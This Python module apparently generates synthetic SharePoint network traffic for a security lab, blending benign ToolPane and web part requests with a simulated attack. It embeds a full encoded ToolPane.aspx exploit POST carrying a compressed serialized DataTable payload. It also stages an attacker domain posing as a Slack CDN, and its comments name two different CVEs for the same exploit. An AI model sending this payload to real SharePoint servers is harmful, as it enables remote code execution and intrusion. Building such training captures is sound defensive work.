"""Protocol-specific traffic generators for the synthetic environment."""

from __future__ import annotations

import random
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from ..serializer import FastPacketSerializer

from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.inet6 import IPv6
from scapy.layers.l2 import Ether
from scapy.packet import Raw

from ..config import (
    DOMAIN_CONTROLLER_IP,
    PUBLIC_SCANNER_IPS,
    RETRANSMISSION_RATE_OTHER,
    SCANNER_BEHAVIORS,
    SCANNER_USER_AGENTS,
    SHAREPOINT_HOSTNAME,
    SHAREPOINT_SERVER_IP,
    SHAREPOINT_VULNERABLE_ENDPOINTS,
)
from ..helpers import (
    format_guid_for_url,
    generate_random_guid,
    generate_realistic_user_agent,
    generate_request_digest,
    generate_request_duration,
    generate_sharepoint_health_score,
    generate_sharepoint_json_response,
    generate_sharepoint_list_guid,
    generate_view_guid,
)
from ..logging_setup import get_logger
from ..state import generator, get_mac_fast, random_pool
from ..tcp import (
    apply_retransmissions_smart,
    create_tcp_ack,
    create_tcp_fin_ack,
    create_tcp_psh_ack,
    create_tcp_rst,
    create_tcp_syn,
    create_tcp_synack,
    exponential_delay,
    tcp_fin_handshake,
    tcp_handshake,
)
from .dns import generate_dns_query, generate_dns_query_response, generate_dns_response
from .http import (
    generate_http_file_download_outbound,
    generate_http_response,
)
from .icmp import (
    generate_icmp_ping,
    generate_icmp_reply,
)

logger = get_logger(__name__)


# ---
# LEGITIMATE SHAREPOINT VULNERABLE ENDPOINT TRAFFIC (BLENDING)
# ---
def generate_legitimate_toolpane_requests(src_ip, dst_ip, sport, start_time):
    """Generate legitimate ToolPane.aspx requests to blend with exploit traffic"""
    packets = []
    current_time = start_time

    # TCP handshake
    packets.extend(tcp_handshake(src_ip, dst_ip, sport, 8080, current_time))
    current_time += random_pool.delay_handshake()

    conn = generator.get_connection(src_ip, dst_ip, sport, 8080)
    conn_server = generator.get_connection(dst_ip, src_ip, 8080, sport)

    # Legitimate ToolPane.aspx request with realistic parameters
    toolpane_uri = "/_layouts/15/ToolPane.aspx?DisplayMode=Edit&PageView=Shared"

    # Realistic ToolPane POST body with legitimate control URIs
    legitimate_controls = [
        "/_controltemplates/15/ContentByQueryWebPart.ascx",
        "/_controltemplates/15/ContentBySearchWebPart.ascx",
        "/_controltemplates/15/XsltListViewWebPart.ascx",
        "/_controltemplates/15/SummaryLinksWebPart.ascx",
        "/_controltemplates/15/TableOfContentsWebPart.ascx",
        "/_controltemplates/15/ContentEditorWebPart.ascx",
    ]

    control_uri = random.choice(legitimate_controls)

    # Legitimate DWP (Web Part Definition) with realistic property names
    legitimate_dwp = """<%@ Register Tagprefix="WebPartPages" Namespace="Microsoft.SharePoint.WebPartPages" Assembly="Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" %>
<WebPartPages:DataFormWebPart runat="server" 
    IsIncluded="True"
    FrameType="None" 
    NoDefaultStyle="TRUE"
    ViewFlag="8"
    Title="Document Library View"
    Description="Displays documents from the site"
    IsVisible="True" 
    ChromeType="None"
    AllowMinimize="False" 
    AllowRemove="True"
    ListName="{B3A5A6E2-9F4C-4D8E-A1B2-C3D4E5F6A7B8}"
    ListDisplayName="Shared Documents"
    ViewContentTypeId="0x"
    PageSize="30"
    UseSQLDataSourcePaging="True"
    DataSourceID="DocumentLibraryDataSource"
    FireInitialRow="True"
    AllowEdit="True"
    AllowDelete="False" />"""

    # URL encode the parameters
    import urllib.parse

    encoded_uri = urllib.parse.quote(f"http://10.3.10.11{control_uri}", safe="")
    encoded_dwp = urllib.parse.quote(legitimate_dwp, safe="")

    post_body = f"MSOTlPn_Uri={encoded_uri}&MSOTlPn_DWP={encoded_dwp}&MSOWebPartPage_PostbackSource=&MSOTlPn_Button=OK"

    request_text = f"POST {toolpane_uri} HTTP/1.1\r\n"
    request_text += f"Host: {SHAREPOINT_HOSTNAME}:8080\r\n"
    request_text += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0.0.0\r\n"
    request_text += "Referer: /_layouts/15/editpage.aspx\r\n"
    request_text += "Content-Type: application/x-www-form-urlencoded\r\n"
    request_text += f"Content-Length: {len(post_body)}\r\n"
    request_text += f"Cookie: session_id={generator.get_session_cookie(src_ip)}\r\n"
    request_text += "\r\n"
    request_text += post_body

    request = request_text.encode()

    pkt = create_tcp_psh_ack(src_ip, dst_ip, sport, 8080, conn.seq, conn.ack, 65535, request, current_time)
    packets.append(pkt)
    conn.seq += len(request)
    current_time += exponential_delay(0.010, 0.050, 50)

    iis_version, aspnet_version = generator.get_server_versions(dst_ip)

    # Note: Generate realistic variable-size XML response body
    response_body = (
        b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ToolPane_Response>'
    )
    response_body += b"<data>Pane configuration data for web part</data>" * random.randint(5, 15)
    response_body += b"</ToolPane_Response></soap:Body></soap:Envelope>"

    response_text = "HTTP/1.1 200 OK\r\n"
    response_text += "Content-Type: application/xml\r\n"  # XML response for web part configuration.
    response_text += f"Server: {iis_version}\r\n"
    response_text += f"X-SharePointHealthScore: {generate_sharepoint_health_score()}\r\n"
    response_text += "X-Powered-By: ASP.NET\r\n"
    response_text += f"Content-Length: {len(response_body)}\r\n"  # Use actual length
    response_text += "\r\n"

    response = response_text.encode() + response_body  # Add body to response

    pkt = create_tcp_psh_ack(dst_ip, src_ip, 8080, sport, conn_server.seq, conn.seq, 65535, response, current_time)
    packets.append(pkt)

    return packets


def generate_legitimate_vulnerable_endpoint_requests(src_ip, dst_ip, sport, start_time):
    """Generate legitimate requests to historically vulnerable SharePoint endpoints"""
    packets = []
    current_time = start_time

    # TCP handshake
    packets.extend(tcp_handshake(src_ip, dst_ip, sport, 8080, current_time))
    current_time += random_pool.delay_handshake()

    conn = generator.get_connection(src_ip, dst_ip, sport, 8080)
    conn_server = generator.get_connection(dst_ip, src_ip, 8080, sport)

    # Generate dynamic GUIDs for this request
    list_guid = format_guid_for_url(generate_sharepoint_list_guid())
    view_guid = format_guid_for_url(generate_view_guid())
    item_id = random.randint(1, 500)
    dialog_type = random.choice(["EmailPicker", "UserPicker", "PeoplePicker"])

    vulnerable_endpoints = [
        # PickerDialogFrame.aspx (CVE-2020-0932)
        {"uri": f"/_layouts/15/PickerDialogFrame.aspx?DialogType={dialog_type}", "method": "GET", "body": "", "referer": "/_layouts/15/people.aspx"},
        # ViewEditForm.aspx (information disclosure)
        {"uri": f"/_layouts/15/ViewEditForm.aspx?List={list_guid}&ID={item_id}", "method": "GET", "body": "", "referer": "/_layouts/15/viewlsts.aspx"},
        # emailPickerDialog.aspx (CVE-2020-16952)
        {"uri": "/_layouts/15/emailPickerDialog.aspx?MultiSelect=true&AllowGroups=true", "method": "GET", "body": "", "referer": "/_layouts/15/settings.aspx"},
        # DataFormWebPart legitimate usage
        {"uri": "/_layouts/15/WebPartGallery.aspx", "method": "GET", "body": "", "referer": "/_layouts/15/settings.aspx"},
        # viewEdit.aspx (CVE-2019-1257)
        {"uri": f"/_layouts/15/viewEdit.aspx?List={list_guid}&View={view_guid}", "method": "GET", "body": "", "referer": "/_layouts/15/viewlsts.aspx"},
    ]

    endpoint = random.choice(vulnerable_endpoints)

    # Build request
    request_text = f"{endpoint['method']} {endpoint['uri']} HTTP/1.1\r\n"
    request_text += f"Host: {SHAREPOINT_HOSTNAME}:8080\r\n"
    request_text += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0\r\n"
    request_text += f"Referer: {endpoint['referer']}\r\n"
    request_text += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    request_text += f"Cookie: session_id={generator.get_session_cookie(src_ip)}\r\n"

    if endpoint["body"]:
        request_text += f"Content-Length: {len(endpoint['body'])}\r\n"
        request_text += "Content-Type: application/x-www-form-urlencoded\r\n"
        request_text += "\r\n"
        request_text += endpoint["body"]
    else:
        request_text += "\r\n"

    request = request_text.encode()

    pkt = create_tcp_psh_ack(src_ip, dst_ip, sport, 8080, conn.seq, conn.ack, 65535, request, current_time)
    packets.append(pkt)
    conn.seq += len(request)
    current_time += exponential_delay(0.010, 0.050, 50)

    # Note: Generate realistic variable-size JSON response body
    # Generate realistic SharePoint JSON response
    json_response = generate_sharepoint_json_response("list_items", random.randint(3, 8))
    import json

    response_body = json.dumps(json_response).encode("utf-8")

    iis_version, aspnet_version = generator.get_server_versions(dst_ip)
    sp_build = random.randint(10000, 10500)  # Realistic SharePoint 2019/2021/SE builds

    response_text = "HTTP/1.1 200 OK\r\n"
    response_text += "Content-Type: application/json; charset=utf-8\r\n"  # JSON response for API data.
    response_text += f"Server: {iis_version}\r\n"
    response_text += f"X-SharePointHealthScore: {generate_sharepoint_health_score()}\r\n"
    response_text += f"X-AspNet-Version: {aspnet_version}\r\n"
    response_text += f"SPRequestDuration: {generate_request_duration()}\r\n"
    response_text += "X-Powered-By: ASP.NET\r\n"
    response_text += f"MicrosoftSharePointTeamServices: 16.0.0.{sp_build}\r\n"
    response_text += f"Content-Length: {len(response_body)}\r\n"  # Use actual length
    response_text += "\r\n"

    response = response_text.encode() + response_body  # Add body to response

    pkt = create_tcp_psh_ack(dst_ip, src_ip, 8080, sport, conn_server.seq, conn.seq, 65535, response, current_time)
    packets.append(pkt)

    return packets


def generate_sharepoint_webpart_configuration_traffic(src_ip, dst_ip, sport, start_time):
    """Generate legitimate web part configuration requests"""
    packets = []
    current_time = start_time

    # TCP handshake
    packets.extend(tcp_handshake(src_ip, dst_ip, sport, 8080, current_time))
    current_time += random_pool.delay_handshake()

    conn = generator.get_connection(src_ip, dst_ip, sport, 8080)
    conn_server = generator.get_connection(dst_ip, src_ip, 8080, sport)

    # Generate random GUIDs for this request (realistic variability)
    generate_random_guid()
    generate_random_guid()

    # Legitimate web part configuration XML
    webpart_configs = [
        # Content Editor Web Part
        """<WebPart xmlns="http://schemas.microsoft.com/WebPart/v2">
  <Title>Announcements</Title>
  <FrameType>Default</FrameType>
  <Description>Displays recent site announcements</Description>
  <IsIncluded>true</IsIncluded>
  <ZoneID>LeftColumn</ZoneID>
  <PartOrder>2</PartOrder>
  <FrameState>Normal</FrameState>
  <Height />
  <Width />
  <AllowRemove>true</AllowRemove>
  <AllowZoneChange>true</AllowZoneChange>
  <AllowMinimize>true</AllowMinimize>
  <IsVisible>true</IsVisible>
  <DetailLink />
  <HelpLink />
  <Dir>Default</Dir>
  <PartImageSmall />
  <MissingAssembly>Cannot import this Web Part.</MissingAssembly>
  <IsIncludedFilter />
  <Assembly>Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c</Assembly>
  <TypeName>Microsoft.SharePoint.WebPartPages.ContentEditorWebPart</TypeName>
  <ContentLink>~site/Documents/AnnouncementsContent.html</ContentLink>
  <Content><![CDATA[<div class="announcements-container"><h3>Recent Updates</h3></div>]]></Content>
</WebPart>""",
        # XsltListViewWebPart
        """<WebPart xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.microsoft.com/WebPart/v2">
  <Title>Document Library</Title>
  <FrameType>Default</FrameType>
  <Description>Displays documents from the Shared Documents library</Description>
  <IsIncluded>true</IsIncluded>
  <ZoneID>MainZone</ZoneID>
  <PartOrder>1</PartOrder>
  <FrameState>Normal</FrameState>
  <Height />
  <Width />
  <AllowRemove>true</AllowRemove>
  <AllowZoneChange>true</AllowZoneChange>
  <AllowMinimize>true</AllowMinimize>
  <AllowConnect>true</AllowConnect>
  <AllowEdit>true</AllowEdit>
  <AllowHide>true</AllowHide>
  <IsVisible>true</IsVisible>
  <DetailLink />
  <HelpLink />
  <HelpMode>Modeless</HelpMode>
  <Dir>Default</Dir>
  <PartImageSmall />
  <MissingAssembly>Cannot import this Web Part.</MissingAssembly>
  <PartImageLarge>/_layouts/15/images/itdl.png</PartImageLarge>
  <IsIncludedFilter />
  <Assembly>Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c</Assembly>
  <TypeName>Microsoft.SharePoint.WebPartPages.XsltListViewWebPart</TypeName>
  <ListDisplayName>Shared Documents</ListDisplayName>
  <ListName>{list_guid}</ListName>
  <ViewGuid>{view_guid}</ViewGuid>
  <ViewFlags>Html Hidden RecurrenceRowset</ViewFlags>
  <ViewType>Html</ViewType>
  <PageSize>30</PageSize>
</WebPart>""",
        # DataFormWebPart for list views
        """<WebPart xmlns="http://schemas.microsoft.com/WebPart/v2">
  <Title>Tasks Overview</Title>
  <FrameType>Default</FrameType>
  <Description>Displays current team tasks</Description>
  <IsIncluded>true</IsIncluded>
  <ZoneID>RightColumn</ZoneID>
  <PartOrder>3</PartOrder>
  <FrameState>Normal</FrameState>
  <AllowRemove>true</AllowRemove>
  <AllowZoneChange>true</AllowZoneChange>
  <IsVisible>true</IsVisible>
  <Assembly>Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c</Assembly>
  <TypeName>Microsoft.SharePoint.WebPartPages.DataFormWebPart</TypeName>
  <ListName>{list_guid}</ListName>
  <ListDisplayName>Team Tasks</ListDisplayName>
  <ViewContentTypeId>0x</ViewContentTypeId>
  <DataSourceID>TasksDataSource</DataSourceID>
  <PageSize>20</PageSize>
  <UseSQLDataSourcePaging>True</UseSQLDataSourcePaging>
</WebPart>""",
    ]

    webpart_xml = random.choice(webpart_configs)

    # Build POST request with web part XML
    import urllib.parse

    encoded_xml = urllib.parse.quote(webpart_xml, safe="")

    post_body = f"WebPartXml={encoded_xml}&SaveOption=Common&WebPartPageUrl=/SitePages/Home.aspx"

    request_text = "POST /_layouts/15/WebPartPages.aspx?Mode=AddWebPart HTTP/1.1\r\n"
    request_text += f"Host: {SHAREPOINT_HOSTNAME}:8080\r\n"
    request_text += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/118.0.0.0\r\n"
    request_text += "Referer: /_layouts/15/editpage.aspx\r\n"
    request_text += "Content-Type: application/x-www-form-urlencoded\r\n"
    request_text += f"Content-Length: {len(post_body)}\r\n"
    request_text += f"X-RequestDigest: {generate_request_digest()}\r\n"
    request_text += "\r\n"
    request_text += post_body

    request = request_text.encode()

    pkt = create_tcp_psh_ack(src_ip, dst_ip, sport, 8080, conn.seq, conn.ack, 65535, request, current_time)
    packets.append(pkt)
    conn.seq += len(request)
    current_time += exponential_delay(0.010, 0.050, 50)

    iis_version, aspnet_version = generator.get_server_versions(dst_ip)

    # Note: Generate realistic variable-size XML response body
    response_body = b'<?xml version="1.0"?><WebPartDetails><Title>Web Part Configuration</Title>'
    response_body += b'<Property name="Height">400</Property>' * random.randint(2, 5)
    response_body += b'<Property name="Width">500</Property>' * random.randint(2, 5)
    response_body += b"</WebPartDetails>"

    response_text = "HTTP/1.1 200 OK\r\n"
    response_text += "Content-Type: application/xml; charset=utf-8\r\n"  # XML response for SOAP-style payloads.
    response_text += f"Server: {iis_version}\r\n"
    response_text += f"X-SharePointHealthScore: {generate_sharepoint_health_score()}\r\n"
    response_text += f"SPRequestDuration: {generate_request_duration()}\r\n"
    response_text += f"Content-Length: {len(response_body)}\r\n"  # Use actual length
    response_text += "\r\n"

    response = response_text.encode() + response_body  # Add body to response

    pkt = create_tcp_psh_ack(dst_ip, src_ip, 8080, sport, conn_server.seq, conn.seq, 65535, response, current_time)
    packets.append(pkt)

    return packets


def generate_sharepoint_outbound_software_downloads(start_time, duration, serializer: FastPacketSerializer | None = None):
    """Generate realistic outbound HTTP traffic from SharePoint downloading software"""
    logger.info("[+] Generating SharePoint outbound software downloads with embedded attacker traffic...")

    use_serializer = serializer is not None
    all_packets = []

    # Software download sources (realistic mix).
    SOFTWARE_DOWNLOADS = [
        # (domain, IP, port, filename, size_mb, requests, file_type)
        # === SLACK ECOSYSTEM (Attacker Hidden Here!) ===
        ("downloads.slack.com", "203.0.113.20", 8080, "/windows/releases/slack-4.46.103-x64.exe", 125, 15, "exe"),
        ("cdn.slack-edge.com", "203.0.113.21", 8080, "/desktop-releases/windows/x64/4.46.102/slack-setup.exe", 118, 12, "exe"),
        ("downloads.slack-cdn.com", "203.0.113.22", 8080, "/Slack_4.46.104_x64.exe", 7.5, 5, "exe"),  # Recon source IP.
        ("files.slack.com", "203.0.113.23", 8080, "/slack-updates/Slack-4.46.101.exe", 120, 10, "exe"),
        # === MICROSOFT DOWNLOADS ===
        ("download.microsoft.com", "198.51.100.20", 8080, "/download/windows/teams-1.6.00.32062.exe", 156, 30, "exe"),
        ("software-download.microsoft.com", "198.51.100.21", 8080, "/download/pr/edge-setup-119.0.exe", 145, 9, "exe"),
        ("officecdn.microsoft.com", "198.51.100.22", 8080, "/pr/office365-2024-installer.exe", 3840, 15, "exe"),
        # === THIRD-PARTY SOFTWARE ===
        ("dl.google.com", "192.0.2.40", 8080, "/chrome/install/119.0.6045.160/chrome_installer.exe", 152, 11, "exe"),
        ("zoom.us", "192.0.2.41", 8080, "/client/5.16.10.24420/ZoomInstallerFull.exe", 95, 7, "exe"),
        ("download.mozilla.org", "192.0.2.42", 8080, "/pub/firefox/releases/119.0/win64/Firefox%20Setup%20119.0.exe", 74, 6, "exe"),
        # === CORPORATE SOFTWARE REPOS ===
        ("packages.company.com", "10.3.100.80", 8080, "/internal/zoom-installer-5.16.10.exe", 98, 7, "exe"),
        ("software-repo.local", "10.3.100.81", 8080, "/apps/chrome-enterprise-119.0.msi", 158, 10, "msi"),
        ("deploy.artifacts.local", "10.3.100.82", 8080, "/releases/vscode-1.84.2-x64-setup.exe", 92, 8, "exe"),
        # === DEVELOPER TOOLS ===
        ("github.com", "203.0.113.40", 8080, "/microsoft/vscode/releases/download/1.84.2/VSCodeUserSetup-x64-1.84.2.exe", 89, 5, "exe"),
        ("nodejs.org", "203.0.113.41", 8080, "/dist/v20.9.0/node-v20.9.0-x64.msi", 32, 4, "msi"),
        # === SYSTEM UTILITIES ===
        ("7-zip.org", "198.51.100.40", 8080, "/a/7z2301-x64.exe", 1.5, 3, "exe"),
        ("notepad-plus-plus.org", "198.51.100.41", 8080, "/repository/8.x/8.5.8/npp.8.5.8.Installer.x64.exe", 4.2, 3, "exe"),
        # === ADOBE PRODUCTS ===
        ("ardownload2.adobe.com", "192.0.2.50", 8080, "/installer/acrobat_dc_2024_installer.exe", 512, 8, "exe"),
        # === VIRTUALIZATION ===
        ("download3.vmware.com", "198.51.100.50", 8080, "/software/WKST-1750-WIN/VMware-workstation-17.5.0.exe", 680, 6, "exe"),
        ("download.virtualbox.org", "198.51.100.51", 8080, "/virtualbox/7.0.12/VirtualBox-7.0.12-159484-Win.exe", 104, 4, "exe"),
        # === COLLABORATION TOOLS ===
        ("aka.ms", "203.0.113.50", 8080, "/teams-windows-x64-installer", 156, 9, "exe"),
        ("downloads.webex.com", "203.0.113.51", 8080, "/WebexDesktop/Windows/43.10.0.25065/Webex.msi", 75, 5, "msi"),
    ]

    sharepoint_ip = SHAREPOINT_SERVER_IP  # 10.3.10.11
    dns_server = DOMAIN_CONTROLLER_IP  # 10.3.30.63

    logger.info(f"    Software download sources: {len(SOFTWARE_DOWNLOADS)}")
    logger.info("    [STEALTH] Attacker: downloads.slack-cdn.com (blended with Slack ecosystem)")

    total_downloads = 0

    for domain, resolved_ip, port, download_path, size_mb, request_count, _file_ext in SOFTWARE_DOWNLOADS:
        # Spread downloads throughout the day
        download_start = start_time + random.uniform(0, duration * 0.9)

        # DNS resolution before first download
        dns_time = download_start - random.uniform(1, 5)
        dns_packets = generate_dns_query_response(sharepoint_ip, dns_server, domain, resolved_ip, dns_time)
        all_packets.extend(dns_packets)

        # Generate download requests
        for i in range(request_count):
            request_time = download_start + (i * random.uniform(300, 1800))  # Spread over time

            if request_time > start_time + duration:
                break

            sport = generator.allocate_port(sharepoint_ip)

            # Generate HTTP download
            download_packets = generate_http_file_download_outbound(sharepoint_ip, resolved_ip, sport, port, domain, download_path, size_mb, request_time)

            all_packets.extend(download_packets)
            total_downloads += 1

    logger.info(f"    Generated {len(all_packets):,} packets")
    logger.info(f"    Total software downloads: {total_downloads}")
    logger.info(f"    [STEALTH] Attacker downloads: 2 (blended with {len(SOFTWARE_DOWNLOADS)} sources)")
    # Write packets if serializer provided, otherwise return
    if use_serializer:
        logger.info(f"    Writing {len(all_packets)} Software Download packets to PCAP...")
        for pkt in all_packets:
            serializer.add_packet(pkt, pkt.time)
        return []  # Return empty (already written)
    else:
        return all_packets  # Return for backward compatibility


def generate_sharepoint_recon_requests(src_ip, dst_ip, attacker_domain, start_time, duration):
    """
    Generate reconnaissance requests from attacker disguised as Slack CDN
    These appear before the exploit POST
    """
    all_packets = []

    exploit_time = start_time + random.uniform(300, 1800)  # 5-30 minutes after start

    # After recon, send exploit POST
    sport = generator.allocate_port(src_ip)
    exploit_packets = generate_exploit_post_request(src_ip, dst_ip, sport, 8080, attacker_domain, exploit_time)
    all_packets.extend(exploit_packets)

    return all_packets


def generate_exploit_post_request(src_ip, dst_ip, sport, dport, domain, start_time):
    """
    Generate the ToolPane.aspx exploit POST request disguised as Slack CDN traffic
    This mimics the CVE-2019-0604 SharePoint RCE exploit
    """
    packets = []
    current_time = start_time

    # TCP handshake
    packets.extend(tcp_handshake(src_ip, dst_ip, sport, dport, current_time))
    current_time += random.uniform(0.01, 0.03)

    conn = generator.get_connection(src_ip, dst_ip, sport, dport)
    conn_server = generator.get_connection(dst_ip, src_ip, dport, sport)

    # Exploit POST request (CVE-2025-53770 - ToolPane.aspx)
    exploit_payload = "MSOTlPn_Uri=http%3a//10.3.10.11%3a8080/_controltemplates/15/AclEditor.ascx&MSOTlPn_DWP=%3c%25%40%20Register%20Tagprefix%3d%22SPWebControls%22%20Namespace%3d%22System.Web.UI%22%20Assembly%3d%22System.Web.Extensions%2c%20Version%3d4.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3d31bf3856ad364e35%22%20%25%3e%0a%3c%25%40%20Register%20Tagprefix%3d%22MSPerformancePoint%22%20Namespace%3d%22Microsoft.PerformancePoint.Scorecards%22%20Assembly%3d%22Microsoft.PerformancePoint.Scorecards.Client%2c%20Version%3d16.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3d71e9bce111e9429c%22%20%25%3e%0a%20%20%3cSPWebControls%3aUpdateProgress%3e%0a%20%20%20%20%3cProgressTemplate%3e%0a%20%20%20%20%20%20%3cMSPerformancePoint%3aExcelDataSet%20CompressedDataTable%3d%22H4sIAN/dAmkAA9VY6XLbyBG2k8pW4s2/vACL%2bbm2iEOwTRWlKoAgIFAkJPAACGy5anGMAJADkMFBkHi7PEieJekBeMmyLNub9SZQeTjGdPd093z9zQxevHzx4sW/4SG/5PnrH6BRx9s0Q9GZaGf264aOkjRcxpfnZxT5e93o5jjLE3QZozxLbPy6cZc7OHRv0HayXKD40nn3zuZc7i3dZs8R9b79J2L8byc2q2aMMjLXX2YRHrsBiuwfoSeG9/dyYkcvX5KxH/4Izb/%2b3NmkF2kl0thEOE4vm826c7GBfpBlq4tWqyiKs4I9WyZ%2bi6EoujUbDmqze9ko9WDWy2aexDtr6ZsodJNlurzP3rjL6ALk3tRSzUboXTbHdzs/m1evGg3iBcIoQnHWiO0InY43arULJd29uWxmSY4O76cp6uZJAqqDpWtjtBsmZslDTIMDK4w2k%2b0K7V8fhoJl6KJGFMa3rpsnEDMFlu3N/n957Czz2ENe81Rzr/2xz4MwzRRYiUfCz3jysViK/pGj2H1S5qn5pRBhT7fxSXpI0sh0MFyDpLvEGLkZoC49k1GMktA9I37/Qv/88ymOxihZQ2rSMyXOUBLb%2bKy3WdkkFUZir1Yo%2bYU5KBjIOZsqZ4NlKi2TyM5A4XXjOPYtOKfYe%2b7%2b3T1Nexxls/aH14e5wthbFmnt5K0zh1hI9y5ZrkOPzHuXoBSSYpMQJcA7KpbJ4htcYGnnnn3PvbU99u05YrkPHw4xPUjQf6GKP3xoNrJqkWBR7XhLFqz5EJStJ/HSegYwlcBngFeN75D0oDxah/o4FNMnTD1Ur72pKODq1Q%2bEaP75944HzOMnF/WPHX0TadQ6tYnndPYTvVnTu0rsHPjkGGHnWK%2bNnYeEmSa2g4/lkyyL2wRgVfHCTiqw025gxz6ChQnjFCXZI3ronNbigVDD5xn1DRjMbFjJIw17X8DDj9e981G13t6fVufjuvkOTjY%2bDeGDp70aRE8gvQOeEqeRBx0IKNtST9NjZ4iyYOmpUP1XItBBEto4LFGndfL%2bOeU7m5AHJCv9HA2D%2bK5gv0cGwfjFnii8izRLwthvXrWK3nY7GvK8xvP8XQue9wJ/eIouace6yrnsCDvjwtcjfesyeO3MKWow5/Nh97wYdAXRMzaUN%2bvjO4PD3my0NY0iVSSBNqPNyqQyjPTR2mb0/M5QWJXp0WY5ZYaTRanK0%2bJWXEjV/IomTFlcerKeDRbq2pE32GRHK4fhysHCww7MbRvDfMq0tyCzmDI6ZYqSY9B7/7iJd91fOZGbKjJdmiDnyDgE/wxr1i9to53fTbTa5zmfKj2Vdq5HtBtN22CbBt3A6Rb%2b9FoPQW8%2bZnROl9uJZZy3zbnLmhN9rk7Mze1kSFkT/vwWVOpk6aLD6rnHB6LD0IUJeXB97zCnMMWUZdAlzw95wQ9V/pBPDuQ3qWWoFJFzt9y1BflzIzyv4p8JAfRLiP9oN%2bI3Bp1N0EwFm1Q%2bZUeQEy6GGDOXUdcuyXf4W60TqGh%2bhQneJ81CPOn3SCtAjDzf/T%2bPsQplMGNO/TsXFXyIqWcZG2wxEmXpKoklALy8NWcVVhWId2HNlL5AMC30esccmTJp54WyNrfCHPABfoJOl8/A39RkpLktT/2BYfr29YhyxeV6wIzWHsOlDiMtIHelI4PMlp5b8nkO%2bM4GtJqahprMSi1XRTMfTnhqxvqM2uUwAltauXL1GfgYq%2b4e17PeiU160x33LLDhWahUimGpsaahMZahFKbRDyzRL9U5nlviCFsTn72dSDC3Fd3rm0nlC/0ecq8xg3mvUKX2uTrXcmsWYKVr%2bpCrwI01f0Apv5sfgu%2bSlIsmQy8Efkr64ZFjYC1lPYZ1w8AlgDEptWerwJMBU4sA%2bGcEdUzwzCsjWQcMezA2vXYMnbLl9mLIe5k1Gy0dRtvwxVAcSl%2bFj%2bRoU5eceLRF4/YR85EegW/zypeQU4E/QsBL34ms9ZO%2bhr9S318oJNiutiA//W6FWa1696tj06p16HnXuLC0IHBZFTtGP0WaRUHNx9ZMG3uytLWA03UiM5VKl9EzqFlOjAFHkYc9acS5sn5rGjTuRjT25GBt9bjAMaaq9Wi%2bnsD78E8bFl%2b13mF2jG8KnH7d5wQ/JVkp%2bGP9y57BzU1R/R33Hir9H5m7B3mMnagNOcZz4CjNjdrAbWoJ8%2b/xCPxrkdoHjJy31doP8KfwNVZPvWt9a01oqFedciMpBT3NA2zYhjqwZnjqMBl25nSoll6gGkNanfe4YTnCQ9HnQEWuNqFe9h32hsWN4FOE1PsHTP1WOdbMWxKWjJ/Ps%2bC/J6LStObbfr3haP1qEzuu09gyrMM%2bPFjQpP6wu8C5FbUnEMPKNDYrFEnV%2bFhup1BTW6EgVkZVzYm9Y01OIimzNCwC95YuVdVgf8pg8E%2bq8tvF6spiuKBeW%2bVmYhA9fVvV9kg4nAE0qH0PbEPNljypWbL3Fr56yC%2buat6ZaYu7mpuoipvEej%2btCP3uC3KkSCrhGepG%2bkTNPH63EoLK9E8n3AH58XKHJfkDbGNh6zDAf%2bzQ3%2bV9efRZBRxDXrew3o/e7TjW793U8VRxGNXZidqfN6b9%2bmBlmtXmpT/yT5aJXjfrO7FWDkPhcHb68viWxPT2GB/OPXG4BdzuffjaeKpI6sOh6ZDWfXAGrPxbuUw7/73P7F2tAvXN7rdfHcr4hVHHkV52Wrtr2Wfuea0vv%2bh16huzsru2nVzETq/VzatO66HgE3fZ1pdcZjutr7zDf/QNonX6EeLku0fr%2bOFj93WkdfJ5pNP66HPN1asf/wMl6EcbyxYAAA%3d%3d%22%20DataTable-CaseSensitive%3d%22true%22%20runat%3d%22server%22/%3e%0a%20%20%20%20%3c/ProgressTemplate%3e%0a%20%20%3c/SPWebControls%3aUpdateProgress%3e%0a"

    # request = f"POST /_layouts/15/ToolPane.aspx/uepfpteojnmhcrb?DisplayMode=Edit&utfoplxhhe=/ToolPane.aspx HTTP/1.1\r\n"
    request = "POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit HTTP/1.1\r\n"
    request += f"Host: {SHAREPOINT_HOSTNAME}:8080\r\n"
    request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0\r\n"
    request += "Referer: http://10.3.10.11/_layouts/SignOut.aspx\r\n"  # Fix referer too
    request += "Content-Type: application/x-www-form-urlencoded\r\n"
    request += f"Content-Length: {len(exploit_payload)}\r\n"
    request += "Connection: keep-alive\r\n"
    request += "\r\n"
    request += exploit_payload

    pkt = create_tcp_psh_ack(src_ip, dst_ip, sport, dport, conn.seq, conn.ack, 65535, request.encode(), current_time)
    packets.append(pkt)
    conn.seq += len(request)
    current_time += random.uniform(0.05, 0.15)

    # Server response: 401 Unauthorized (then later 200 OK with reverse shell)
    response = "HTTP/1.1 401 Unauthorized\r\n"
    response += "Cache-Control: private, max-age=0\r\n"
    response += "Content-Type: text/plain; charset=utf-8\r\n"
    response += "Server: Microsoft-IIS/10.0\r\n"
    response += "WWW-Authenticate: NTLM\r\n"
    response += "Content-Length: 16\r\n"
    response += "\r\n"
    response += "401 UNAUTHORIZED"

